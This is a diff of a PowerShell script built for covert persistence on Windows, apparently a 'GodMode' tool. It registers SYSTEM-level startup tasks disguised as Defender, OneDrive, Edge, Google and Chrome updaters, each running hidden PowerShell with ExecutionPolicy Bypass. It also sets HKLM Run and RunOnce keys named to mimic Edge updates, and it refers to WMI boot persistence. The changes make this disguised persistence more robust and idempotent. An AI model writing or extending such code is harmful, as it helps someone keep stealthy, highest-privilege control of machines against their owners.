@@ -1853,11 +1853,17 @@ function Register-DeepPersistence {
         # Additional scheduled tasks with different names
         $ExtraPrefixes = @("WindowsDefenderSigUpdates_", "OneDriveStandaloneUpdater_", "EdgeWebView2Updater_")
         foreach ($Prefix in $ExtraPrefixes) {
+            # Skip if any task with this prefix already exists (idempotent)
+            if (Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue) {
+                Write-Log -Message "Deep persistence task prefix $Prefix already exists; skipping." -Type "INFO" -Color Gray
+                continue
+            }
             $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
             $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
             $trigger = New-ScheduledTaskTrigger -AtStartup
             $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
             Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue | Out-Null
+            Write-Log -Message "Deep persistence task $taskName registered." -Type "INFO" -Color Gray
         }
         
         # WMI boot-level persistence (fires on Win32_Process startup within 60 seconds of boot)
@@ -2194,7 +2200,7 @@ function Register-StealthTask {
     Unregister-StealthTask
 
     $action = New-ScheduledTaskAction -Execute "powershell.exe" `
-        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Launch"
+        -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -Launch"
 
     $trigger = New-ScheduledTaskTrigger -AtStartup
     $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" `
@@ -2357,7 +2363,7 @@ function Enable-GodMode {
 
     # --- Registry Persistence (Run keys) ---
     Write-Log -Message "Setting registry persistence keys..." -Type "INFO" -Color Gray
-    $ScriptCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ToggleOn"
+    $ScriptCmd = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
     try {
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "MicrosoftEdgeUpdateCore" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
         Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" -Name "MicrosoftEdgeUpdateCore" -Value $ScriptCmd -Force -ErrorAction SilentlyContinue
@@ -2369,8 +2375,13 @@ function Enable-GodMode {
     $BackupPrefixes = @("GoogleUpdateTask_", "ChromeUpdater_", "OneDriveSyncTask_")
     foreach ($Prefix in $BackupPrefixes) {
         try {
+            # Skip if any task with this prefix already exists (idempotent)
+            if (Get-ScheduledTask -TaskName "$Prefix*" -ErrorAction SilentlyContinue) {
+                Write-Log -Message "Backup task prefix $Prefix already exists; skipping." -Type "INFO" -Color Gray
+                continue
+            }
             $taskName = $Prefix + (Get-Random -Minimum 10000 -Maximum 99999)
-            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -ToggleOn"
+            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$GodModeInstallScript`" -ToggleOn"
             $trigger = New-ScheduledTaskTrigger -AtStartup
             $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
             Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
